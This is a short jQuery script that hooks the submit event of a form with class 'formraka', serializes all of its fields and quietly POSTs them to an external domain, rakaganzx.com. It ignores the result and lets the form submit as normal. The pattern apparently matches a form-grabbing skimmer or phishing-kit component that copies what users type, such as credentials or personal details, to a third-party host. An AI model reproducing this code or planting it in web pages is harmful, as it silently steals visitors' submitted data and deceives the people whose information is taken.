$(".formraka").submit(function() {
    var d = $(".formraka");

    $.ajax({
        url: "http://rakaganzx.com",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});